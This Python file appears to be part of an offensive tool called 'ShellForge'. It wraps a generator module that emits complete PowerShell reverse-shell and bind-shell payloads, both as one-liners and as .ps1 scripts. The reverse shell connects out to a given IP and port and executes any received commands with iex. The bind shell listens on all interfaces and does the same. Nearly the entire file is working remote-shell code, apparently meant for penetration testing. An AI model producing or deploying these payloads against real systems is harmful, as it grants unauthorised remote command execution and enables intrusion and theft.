from pathlib import Path
content = r'''"""
PowerShell reverse and bind shell payload generators.

Produces both one-liners and multi-line .ps1 script content suitable
for saving to a file with --output.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class PowershellGenerator(PayloadGenerator):
    """Standard PowerShell TCP client reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        parts = [
            "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});",
            "$stream = $client.GetStream();",
            "[byte[]]$bytes = 0..65535|%{{0}};",
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{",
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);",
            "$sendback = (iex $data 2>&1 | Out-String );",
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';",
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);",
            "$stream.Write($sendbyte,0,$sendbyte.Length);",
            "$stream.Flush()}};",
            "$client.Close()",
        ]
        return "".join(parts).format(ip=ip, port=port)

    def bind(self, port: int) -> str:
        parts = [
            "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});",
            "$listener.Start();",
            "$client = $listener.AcceptTcpClient();",
            "$stream = $client.GetStream();",
            "[byte[]]$bytes = 0..65535|%{{0}};",
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{",
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);",
            "$sendback = (iex $data 2>&1 | Out-String );",
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';",
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);",
            "$stream.Write($sendbyte,0,$sendbyte.Length);",
            "$stream.Flush()}};",
            "$client.Close();$listener.Stop()",
        ]
        return "".join(parts).format(port=port)

    def file_extension(self) -> str:
        return ".ps1"

    def reverse_script(self, ip: str, port: int) -> str:
        """Multi-line .ps1 reverse shell suitable for saving to a file."""
        return (
            "# ShellForge PowerShell Reverse Shell\n"
            "# Author: Mostafa Tamime\n"
            f"# Target: {ip}:{port}\n\n"
            f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port})\n"
            "$stream = $client.GetStream()\n"
            "[byte[]]$bytes = 0..65535|%{0}\n"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n"
            "    $data = (New-Object -TypeName System.Text.ASCIIEncoding)"
            ".GetString($bytes,0,$i)\n"
            "    $sendback = (iex $data 2>&1 | Out-String )\n"
            "    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '\n"
            "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n"
            "    $stream.Write($sendbyte,0,$sendbyte.Length)\n"
            "    $stream.Flush()\n"
            "}\n"
            "$client.Close()\n"
        )

    def bind_script(self, port: int) -> str:
        """Multi-line .ps1 bind shell suitable for saving to a file."""
        return (
            "# ShellForge PowerShell Bind Shell\n"
            "# Author: Mostafa Tamime\n"
            f"# Port: {port}\n\n"
            f"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port})\n"
            "$listener.Start()\n"
            "$client = $listener.AcceptTcpClient()\n"
            "$stream = $client.GetStream()\n"
            "[byte[]]$bytes = 0..65535|%{0}\n"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n"
            "    $data = (New-Object -TypeName System.Text.ASCIIEncoding)"
            ".GetString($bytes,0,$i)\n"
            "    $sendback = (iex $data 2>&1 | Out-String )\n"
            "    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '\n"
            "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n"
            "    $stream.Write($sendbyte,0,$sendbyte.Length)\n"
            "    $stream.Flush()\n"
            "}\n"
            "$client.Close()\n"
            "$listener.Stop()\n"
        )
'''
# Fix: r''' preserves backslashes but we need real newlines in the string content
# The content above used \n as two chars in reverse_script/bind_script return strings
# because of r'''. Rebuild without raw for the f-string parts carefully via bytes.